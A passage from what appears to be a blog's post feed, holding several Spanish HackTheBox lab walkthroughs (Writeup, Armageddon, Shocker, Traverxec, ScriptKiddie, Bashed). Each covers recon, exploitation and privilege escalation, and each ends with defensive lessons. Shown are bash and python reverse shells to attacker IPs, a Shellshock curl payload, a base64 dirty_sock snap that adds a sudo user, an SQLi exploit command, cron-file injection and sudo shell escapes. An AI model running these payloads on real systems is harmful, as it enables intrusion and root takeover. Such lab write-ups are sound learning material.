10.10.10.138Nos arroja este resultado:~  nmap -sC -sV -p22,80 10.10.11.138 -Pn  4s  Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 11:07 EDTNmap scan report for 10.10.11.138Host is up.PORT STATE SERVICE VERSION22/tcp filtered ssh80/tcp filtered httpService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 3.70 secondsPodemos observar dos puertos abiertos, el 22 que pertenece a ssh y el 80 que es un http, procederemos a revisar la web que corre en el servicio http y haremos una busqueda de directorio con gobuster.Al parecer el servidor web está protegido a Dos, por eso gobuster no puede hacer su trabajo, revisando robots.txt una ruta muy comun en los ctf, podemos ver que tiene el directorio writeup oculto.Al revisar ese directorio solo son writeups de otras maquinas, pero al escanear la página con Wappalizer podemos observar que está hecho con CMS Made Simple, lo cual parece curioso.Al investigar exploits en esta tecnología nos encontramos con un SQL Injection ExploitEste exploit es un sql injection basado en tiempo, lo que hace es dumpear las credenciales del portal y nos la entrega junto con la contraseña que esta hasheada, pero tiene una opcion para hacer bruteforce a la contraseña.Luego de descargarnolos, ejecutamos el exploit con el comandopython2 exploit.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txt Con estas credenciales nos logeamos via ssh con el usuario jkr y obtenemos el user.txt.Escalamiento de privilegiosLuego de obtener acceso como el usuario jkr, probé con sudo -l para listar los binarios que se pueden ejecutar como sudo, pero no tenia privilegios, luego vi los grupos en los que estaba el usuario jkr y habia uno llamado staff, investigando un poco encontré que este grupo puede crear archivos dentro de usr/local/bin.Luego listé los procesos que se ejectuban en la maquina con la herramienta pspy, luego de esto como no encontré nada, pedí ayuda a unos colegas y me dijeron que revise los procesos llamados cuando se iniciaba sesion son ssh, en otra terminal me logeé y al momento de logearme via ssh ocurría esto en la maquina.Como podemos observar se ejecuta el comando run-parts sin ruta absoluta, entonces podemos aprovechar para colar un archivo llamado run parts en los directorios del path y autoejecutarse al momento de que lo encuentre, esta vulnerabilidad se llama Path Hijacking.Hay varias formas de obtener root con esta vulnerabilidad, podemos crear una reverse shell en el archivo run-parts o simplemente asignar permisos SUID a la bash , en este caso crearemos una reverse shell con el comando.bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&#39;Luego le damos persmisos de ejecución con el comandochmod +x run-partsPor ultimos en otra terminal nos logeamos via ssh con el usuario jkr y obtenemos la reverse shell hacia nuestra maquina como el usuario root.Finalmente nos metemos al directorio de root y observamos el root.txt.ConclusionesFue una buena maquina y nos deja unas cuantas lecciones…No usar versiones antiguas de las tecnologías web y menos sabiendo que tienen vulnerabilidades criticas.No manejar contraseñas faciles de descrifrar, se sugiere una constraseña con simbolos y mayusculas.No asignar grupos con permisos de escritura como el de staff a un usuario no privilegiado.Sanitizar el input del usuario para evitar sql injections basados en tiempo.Gracias por leer, Happy hacking and always try harder!" }, { "title": "HackTheBox Armageddon", "url": "/posts/armageddon-htb/", "categories": "HTB Writeups, Linux Easy", "tags": "sql, drupal, mysql, suid, exploit, python", "date": "2021-07-24 11:00:00 -0500", "snippet": "Machine IP : 10.10.10.233DATE : 24/07/2021Matriz de la maquinaEsta matriz nos muestra las características de explotación de la maquina.ReconocimientoPrimero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.Nmap┌──(s4yhii㉿kali)-[~]└─$ nmap -p22,80 -sC -sV -n 10.10.10.233 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 05:46 EDTNmap scan report for 10.10.10.233Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)| 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)|_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-title: Welcome to Armageddon | ArmageddonService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.12 secondsComo podemos obervar tenemos 2 puertos abiertos, el 80 con el servicio http y el 22 ssh, como vemos cuenta con el archivo robots.txt y otros más interesantes, procederemos a inspeccionar en la web.Como podemos ver, el servicio web esta corriendo en el framework drupal, revisando en mestasploit encontramos un exploit que nos permite obtener una shellLuego de configurar los parametros del payload, obtenemos una shell en metasploit y ahora si podemos listar y ver los archivos del servidor web.Luego de inspeccionar cada archivo, dentro del archivo settings.php encontramos estas credenciales.Credenciales de la base de datos array ( &#39;database&#39; =&amp;gt; &#39;drupal&#39;, &#39;username&#39; =&amp;gt; &#39;drupaluser&#39;, &#39;password&#39; =&amp;gt; &#39;CQHEy@9M*m23gBVj&#39;, &#39;host&#39; =&amp;gt; &#39;localhost&#39;, &#39;port&#39; =&amp;gt; &#39;&#39;, &#39;driver&#39; =&amp;gt; &#39;mysql&#39;, &#39;prefix&#39; =&amp;gt; &#39;&#39;, ),Como indica, son las credenciales de una base de datos, entonces vamos a enumerar las tablas que contiene esa base de datos y posteriormente lo interesante que surga de eso, usando el siguiente comando.mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#39;show tables;&#39;mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#39;select * from users;&#39;mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#39;select name,pass from users;&#39;El resultado es el siguiente, encontramos un usuario y una contraseña hasheada del usuario brucetherealadmin.brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURtnishi $S$DDiENuC75Il7Oc4El2weC1X.cDu5pjl6foNQtkIX.t63MwU6H7Tatest $S$DN3zVAhdweEONvPDq9qvZaElRWXaTEyaABfnm5ciyaGxuj0cjKYsaaa $S$DZ7r4xaW5fCslHhuZ0ICo/LljhMt575vdSkXFUJgbPwo3JDyzlKajuan $S$Dum5w6EtPuSuJsOpkOLqlyKGRn96vKgbXFW90NK4TnUH8tMsLWTCGuardemos el hash en un archivo txt y usamos a nuestro amigo john para que nos salve.john user\\_hash.txt \\--wordlist\\=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 14 password hashes with 5 different salts (Drupal7, $S$ \\[SHA512 256/256 AVX2 4x\\]) Cost 1 (iteration count) is 32768 for all loaded hashes Will run 8 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status booboo (?)Obtenemos la contraseña booboo, con esto nos logeamos via ssh y accedemos al usuario brucetherealadmin y obtenemos el usert.txt.Escalamiento de privilegiosLuego de usar el comando sudo -l.[brucetherealadmin@armageddon ~\\]$ sudo \\-l Matching Defaults entries for brucetherealadmin on armageddon: !visiblepw, always\\_set\\_home, match\\_group\\_by\\_gid, always\\_query\\_group\\_plugin, env\\_reset, env\\_keep\\=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS\\_COLORS&quot;, env\\_keep+\\=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC\\_ADDRESS LC\\_CTYPE&quot;, env\\_keep+\\=&quot;LC\\_COLLATE LC\\_IDENTIFICATION LC\\_MEASUREMENT LC\\_MESSAGES&quot;, env\\_keep+\\=&quot;LC\\_MONETARY LC\\_NAME LC\\_NUMERIC LC\\_PAPER LC\\_TELEPHONE&quot;, env\\_keep+\\=&quot;LC\\_TIME LC\\_ALL LANGUAGE LINGUAS \\_XKB\\_CHARSET XAUTHORITY&quot;, secure\\_path\\=/sbin\\\\:/bin\\\\:/usr/sbin\\\\:/usr/bin User brucetherealadmin may run the following commands on armageddon: (root) NOPASSWD: /usr/bin/snap install \\*CSe puede usar el binario nap install, buscando en google algunas vulnerabilidades de dar permisos de root a estas dependencias, me encuentro con este Github donde está el exploit que nos indica su funcionalidad con el siguiente banner.Simply run as is, no arguments, no requirements. If the exploit is successful,the system will have a new user with sudo permissions as follows:username: dirty\\_sockpassword: dirty\\_sockSignifica que agregará el usuario dirty_sock con el mismo usuario y contraseña pero con permisos sudo, y esto podriamos utilizarlo para invocar una shell como root, guardamos el codigo del exploit con este comando.python2 -c &#39;print &quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot; + &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &amp;gt; privesc.snapLuego de crear el paquete snap de instalacion, lo instalamos con el siguiente comando.sudo /usr/bin/snap install --devmode privesc.snapLuego revisames el archivo passwd con el comando cat /etc/passwdNos logeamos como dirty_sock , la contraseña por defecto es dirty_sock.Luego de estar logeados, ingresamos el comando sudo bash para invocar una shell como root, y luego ya somos root.Game over, obtenemos sesion como root y el root.txt.ConclusionesFue una maquina agradable con debilidades que, por desgracia, siguen siendo muy comunes por ahí.Algunas reflexiones y conclusiones de este pentest:Mantener actualizadas las tecnologias usadas para la construcción de tu pagina web.No exponer contraseñas ni usuarios en los archivos de configuración.Almacene sus claves privadas en un repositorio protegido por una autenticación multifactorial. No las dejes “en línea” si no es necesario y no pienses que nadie las encontrará sólo porque crees que las escondiste bien.Evita jugar con la configuración de sudo si no estás seguro de lo que haces y de cómo se puede abusar de ello. Echa un vistazo a GTFObins para empezar…Gracias por leer, Happy hacking and always try harder!Gracias por leer." }, { "title": "HackTheBox Shocker", "url": "/posts/shocker-htb/", "categories": "HTB Writeups, Linux Easy", "tags": "perl, shellshock, sudo, cgi-bin, gobuster", "date": "2021-07-18 11:00:00 -0500", "snippet": "Machine IP : 10.10.10.56DATE : 18/07/2021Matriz de la maquinaEsta matriz nos muestra las características de explotación de la maquina.ReconocimientoPrimero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.NmapUsamos el siguiente comando para escanear todos los puertos de una manera rapida.nmap -p- --open -T5 -v -n -Pn 10.10.10.56Posteriormente utilizamos este comando con los puertos del anterior escaneo para saber las versiones de cada servicio.nmap -sC -sV -n -p2222,80 -Pn 10.10.10.56Nos arroja este resultado:~/HTB/shocker  nmap -sC -sV -p80,2222 10.10.10.56 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 00:02 EDTNmap scan report for 10.10.10.56Host is up (0.16s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site does not have a title (text/html).2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.00 secondsPodemos observar dos puertos abiertos, el 2222 que pertenece a ssh y el 80 que es un http, procederemos a revisar la web que corre en el servicio http y haremos una busqueda de directorio con gobuster.Luego de probar varios diccionarios con gobuster encontré un directorio interesante.gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirb/small.txt -t 100 -q -e http://10.10.10.56/cgi-bin/ (Status: 403) [Size: 294]Investigando sobre la procedencia de este directorio encontré que se relacionaba con una vulnerabilidad que se llamaba shellshock.Leyendo el post anterior entendí como funcionabala vulnerabilidad, entonces utilizé gobuster nuevamente con la flag -x para que me busque archivos con extensiones .sh, para encontrar los scripts dentro de este directorio y obtuve user.sh.gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 100 -x sh -q -e http://10.10.10.56/cgi-bin/user.sh (Status: 200) [Size: 126]Haciendo curl a la pagina con el comando whoami para saber si funciona.curl -H &quot;User-agent: () { :;}; echo; /usr/bin/whoami&quot; http://10.10.10.56/cgi-bin/user.shshellyVemos que nos responde con el usuario shelly ejecutando el comando whoami, entonces trataremos de obtener una reverse shell con el comando.curl -H &quot;User-agent: () { :;}; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.18/443 0&amp;gt;&amp;amp;1&quot; http://10.10.10.56/cgi-bin/user.shHaciendo un netcat -nlvp 443 en nuestra maquina, obtenemos una shell reversa con el usuario shelly y el user.txt.Escalamiento de privilegiosLuego de obtener acceso como el usuario david, probé con sudo -l para listar los binarios que se pueden ejecutar como sudo, se aprecia que se puede ejecutar el binario perl con permisos root, entonces este vector de ataque ya es conocido.Nos vamos a nuestra mejor amiga GTFOBINS y encontramos el siguiente comando que llama a una shell como sudo con el binario perl.sudo perl -e &#39;exec &quot;/bin/sh&quot;;&#39;Obtenemos acceso root y el root.txt.ConclusionesFue una buena maquina para aprender lecciones puntuales como las siguientes…Hubo una mala configuración del servidor web. No se me permitía acceder al directorio /cgi-bin pero por alguna razón se me permitía acceder al archivo user.sh dentro de ese directorio, el administrador debería haber restringido el acceso a todos los archivos del directorio.Otro detalle es que el servidor web estaba ejecutando comandos bash en un sistema que ejecutaba una versión de Bash que era vulnerable a la vulnerabilidad Shellshock, esto nos permitió obtener el acceso inicial al sistema.El ultimo detalle fue configuración insegura del sistema, siempre hay que ajustarse al principio de mínimo privilegio y al concepto de separación de privilegios.Dar al usuario sudo acceso para ejecutar perl, me permitió escalar privilegios.Recomendaría mantener actualizada las versiones de bash para que no interpete () { :; }; de una manera erronea.Evita jugar con la configuración de sudo si no estás seguro de lo que haces y de cómo se puede abusar de ello. Echa un vistazo a GTFObins para empezar..Gracias por leer, Happy hacking and always try harder!" }, { "title": "HackTheBox Traverxec", "url": "/posts/traverxec-htb/", "categories": "HTB Writeups, Linux Easy", "tags": "less, scripts, sudo, journalctl, ssh, nostromo", "date": "2021-07-08 11:00:00 -0500", "snippet": "Machine IP : 10.10.10.165DATE : 08/07/2021Matriz de la maquinaEsta matriz nos muestra las características de explotación de la maquina.ReconocimientoPrimero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.NmapUsamos el siguiente comando para escanear todos los puertos de una manera rapida.nmap -p- --open -T5 -v -n -Pn 10.10.10.165Posteriormente utilizamos este comando con los puertos del anterior escaneo para saber las versiones de cada servicio.nmap -sC -sV -n -p22,80 -Pn 10.10.10.165Nos arroja este resultado:~/HTB/traverxex 59s ❯ nmap -sC -sV -n -p22,80 -Pn 10.10.10.165 59sHost discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 05:16 EDTNmap scan report for 10.10.10.165Host is up (1.1s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)80/tcp open http nostromo 1.9.6|_http-server-header: nostromo 1.9.6|_http-title: TRAVERXECService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 73.06 secondsPodemos observar dos puertos abiertos, el 22 que pertenece a ssh y el 80 que es un http con la version nostromo 1.9.6, procederemos a revisar la web que corre en el servicio http y haremos una busqueda de directorio con gobuster.Luego de fuzzear la web con gobuster, no encontré nada interesante, por eso busqué la version y teconología web que utiliza esta web con el comandowhatweb 10.10.10.165Me arroja el siguiente resultadohttp://10.10.10.165 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nostromo 1.9.6], IP[10.10.10.165], JQuery, Script, Title[TRAVERXEC]Luego de buscar la version nostromo 1.9.6 en google encontre un cve de una vulnerabilidad RCE(Remote Code Execution).Copié el codigo a un archivo .py y ejecuté el script, luego me dio una shell como www-data y haciendole el tratamiento de la tty, quedaría así.Luego de un momento de analizar directorio por directorio encontré archivos de configuracion que tenian el hash de david, un usuario del sistema, y tenia rutas de directorios ocultos pertenecientes a david.Con el hash encontré utilizé john para poder crackearlo y obtuve Nowonly4me como password, que seria la clave de acceso a la pagina protected-file-area, que está dentro del directorio www_public del usuario david.Luego de desencriptarlo…Luego de acceder a la pagina con el usuario david y contraseña Nowonly4me, pude descargar el comprimido que contenia la clave privada de david.Luego hize el mismo procedimiento para obtener la password, usé ssh2john para crackear la password y con el id_rsa pude logearme via ssh y obtener el user.txt.Escalamiento de privilegiosLuego de obtener acceso como el usuario david, probé con sudo -l para listar los binarios que se pueden ejecutar como sudo, pero no encontré nada, luego inspeccioné los binarios con permisos SUID, pero tampoco encontré un vector de ataque.Pero inspeccionando los directorios de david, dentro de la carpeta bin encontré dos archivos, uno server-stats.head y el otro server-stats.sh, dentro del head no habia más que un banner, y en el otro habian comandos llamando a binarios, en la ultima linea llamaba a sudo.El script devuelve las últimas 5 líneas de los registros del servicio nostromo usando journalctl. Esto es explotable porque journalctl invoca el buscador predeterminado, que probablemente sea less. El comando less muestra la salida en la pantalla del usuario y espera la entrada del usuario una vez que se muestra el contenido. Este puede explotarse ejecutando un comando de shell.Ejecutamos el comando para invocar a less/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.serviceY en esta ventana de input ingresamos !/bin/bash para invocar una shell como root.ConclusionesFue una maquina agradable con debilidades que, por desgracia, siguen siendo muy comunes por ahí.Algunas reflexiones y conclusiones de este pentest:Usar una política de contraseñas fuerte y monitorear diariamente si se publican vulnerabilidades para las aplicaciones/bibliotecas/plugins/firmware que tienes en producción.utiliza herramientas de código abierto que todavía se mantienen y que están respaldadas por una comunidad fuerte.Almacene sus claves privadas en un repositorio protegido por una autenticación multifactorial. No las dejes “en línea” si no es necesario y no pienses que nadie las encontrará sólo porque crees que las escondiste bien.Evita jugar con la configuración de sudo si no estás seguro de lo que haces y de cómo se puede abusar de ello. Echa un vistazo a GTFObins para empezar…Gracias por leer, Happy hacking and always try harder!" }, { "title": "HackTheBox ScriptKiddie", "url": "/posts/scriptkiddie-htb/", "categories": "HTB Writeups, Linux Easy", "tags": "cronjobs, payload, mestasploit, suid, exploit, msfvenom", "date": "2021-06-16 11:00:00 -0500", "snippet": "Machine IP: 10.10.10.226DATE : 16/06/2021ReconocimientoPrimero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.Nmap┌──(s4yhii㉿kali)-[~]└─$ nmap -p- --open -T5 -v -n 10.10.10.226 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-15 20:45 EDTInitiating Ping Scan at 20:45Scanning 10.10.10.226 [2 ports]Completed Ping Scan at 20:45, 0.12s elapsed (1 total hosts)Initiating Connect Scan at 20:45Scanning 10.10.10.226 [65535 ports]Discovered open port 22/tcp on 10.10.10.226Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 29.62% done; ETC: 20:46 (0:00:48 remaining)Discovered open port 5000/tcp on 10.10.10.226Completed Connect Scan at 20:46, 60.38s elapsed (65535 total ports)Nmap scan report for 10.10.10.226Host is up (0.12s latency).Not shown: 52711 closed ports, 12822 filtered portsSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE22/tcp open ssh5000/tcp open upnpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 60.62 secondsComo vemos tiene 2 puertos abiertos el 22 y el 5000 uno con el servicio ssh y el otro con el servicio de Plug and Play, que se usa para conectar impresoras, dispositivos bluetooh, etc.Analizando las versiones de los puertos abiertos encontramos lo siguiente.┌──(s4yhii㉿kali)-[~]└─$ nmap -sC -sV -n -p22,5000 10.10.10.226Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-15 20:55 EDTNmap scan report for 10.10.10.226Host is up (0.12s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)| 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)|_ 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5)|_http-title: k1d&#39;5 h4ck3r t00l5Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.78 secondsEcontramos que hay un servidor web corriendo en el puerto 5000 con la cabecera k1d&#39;5 h4ck3r t00l5, lo abrimos en el navegador.Luego de analizar estas 3 funcionalidades me di cuenta que la parte de payloads acepta un archivo , el cual podríamos generar con msfvenom, por eso buscamos en exploits msfvenom y nos genera solo un resultado.Abrimos mestasploit para generar el apk con el payload, configuramos LPORT y LHOST con nuestra ip y el puerto asignado y nos genera un apk ,el cual procederemos a subir a la web como template.Una vez generado subimos a la web y escribimos la ip de nuestra maquina y como OS seleccionamos android, ya que es una apk, luego ponemos en escucha nuestra maquina con el comando nc -nlvp 4444 y le damos a generar.Automáticamente se nos abrirá una reverse shell con el usuario kid.Luego como tenemos acceso de escritura de la carpeta .ssh, añadiremos nuestro id_rsa a la carpeta de known_hosts para conectarnos directamente desde nuestra maquina via ssh.Como vemos ahora tenemos una shell más interactiva y tenemos acceso al user.txt.Escalamiento de privilegiosComo podemos ver este script es ejecutado con permisos pwn, y nos dice que abrirá el archivo hackers para hacer un nmap. Al igual que la maquina bashed, se aprovecha de una tarea automática cron, que es ejecutado como usuario pwn, pero el log hackers se puede editar por kid, entonces esa será nuestra idea, cargaremos el archivo hackers con una reverse shell bash. echo &quot; ;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.186/4446 0&amp;gt;&amp;amp;1&#39; #&quot; &amp;gt; hackersDejamos 2 espacios, ya que en el script de scanlosers al momento de tomar el texto toma a partir del 3er espacio porque hay un cut -f3-, que tomaria los paramatros a partir del 3ero.Como vemos obtuvimos una shell como pwn gracias al script scanlosers y ahora enumeraremos con sudo -l los binarios con permisos SUIDsudo -lComo vemos metasploit tiene permisos SUID para ejecutarse como root, entonces lo ejecutamos con sudo msfconsole y bingo obtenemos sesión como root y podremos ver el root.txtsudo msfconsole!Gracias por leer." }, { "title": "HackTheBox Bashed", "url": "/posts/bashed-htb/", "categories": "HTB Writeups, Linux Easy", "tags": "cronjobs, scripts, python, suid, apache", "date": "2021-06-13 11:00:00 -0500", "snippet": "Machine IP: 10.10.10.68DATE : 13/06/2021ReconocimientoPrimero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.NmapComo vemos solo el puerto 80 está abierto, así que investigaremos en la web para ver si encontramos algo interesanteEn la web no encontré nada :,c, pero phpbash me da una pista.Como vemos es un frontend normal,pero el nombre php bash es algo sospechoso al parecer no muestra directorios, por eso le hacemos un brute force para enumerar los directorios con gobuster.┌──(s4yhii㉿kali)-[~]└─$ gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 1 ⨯ 2 ⚙===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.10.68[+] Method: GET[+] Threads: 200[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/06/13 03:44:34 Starting gobuster in directory enumeration mode===============================================================/images (Status: 301) [Size: 311] [--&amp;gt; http://10.10.10.68/images/]/php (Status: 301) [Size: 308] [--&amp;gt; http://10.10.10.68/php/] /css (Status: 301) [Size: 308] [--&amp;gt; http://10.10.10.68/css/] /dev (Status: 301) [Size: 308] [--&amp;gt; http://10.10.10.68/dev/] /js (Status: 301) [Size: 307] [--&amp;gt; http://10.10.10.68/js/] /fonts (Status: 301) [Size: 310] [--&amp;gt; http://10.10.10.68/fonts/]Como vemos nos arroja muchos directorios, examinando cada uno de ellos pude encontrar algo interesante en /dev, dos archivos con el nombre de la pagina en si phpbashAl abrir el segundo archivo nos carga una shell con el usuario www-data , buscamos el archivo user.txt con el siguiente comandofind / -type f -name &quot;user.txt&quot; 2&amp;gt;/dev/nully bingo, lo encontramos, ahora a tratar de obtener una shell interactiva para poner comandos basicos.Primero intentaremos ver si hay algunos binarios con permisos SUID para ejecutarlos con permisos root, para eso usamos en comando:sudo -lVemos que el usuario Scriptmanager puede ejecutar cualquier comando en su sesion, entonces vamos a invocar una shell en nuestra maquina con netcat, por el lado de nuestra maquina usariamos el comandonc -nlvp 4448Y por el lado de la phpbash, ejecutamos el siguiente comando para establecer una shell reversa con pythonpython -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF\\_INET,socket.SOCK\\_STREAM);s.connect((&quot;nuestraip&quot;,4448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\\[&quot;/bin/sh&quot;,&quot;-i&quot;\\]);&#39;Y así quedaria nuestra shell, luego nos logeamos como scriptmanager con una shell bash con el comandosudo -u scriptmanager /bin/bashLuego hacemos el tratamiento de la tty para que nuestra shell sea interactiva con los siguientes comandospython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;export TERM=screen-256color \\[Ctrl Z\\] stty raw -echo fg \\[INTRO\\] export TERM=screenEscalamiento de privilegios a rootHaremos un ls al directorio raiz y encontramos un directorio llamado scripts con solo permiso para scriptmanager, entramos para ver que archivos o directorios interesantes tiene.Como vemos hay un archivo test.py que pertenece al nuestro usuario y un txt que pertenece a root , cuando nos encontramos con estas situaciones, debemos considerar que una opción es que hay tareas cron o automáticas que se realizan cada cierto tiempo, por eso en esta caso el script está siendo ejecutado como root, ya que el archivo que está escribiendo es propiedad de root, también al revisar que la fecha de creación del archivo va cambiando, podemos afirmar que cada minuto se actualiza el test.txt.Entonces tenemos que buscar que el archivo test.py contenga código malicioso para que cuando se ejecute podamos establecer una shell reversa en nuestra maquina con root.Abriendo un servidor web para pasar mi archivo test.py con el siguiente código, que es el mismo que utilizamos para invocar la shell reversa, pero sin las comillas y el python -c , ya que todo irá dentro del archivo.import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;tuip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);Luego de 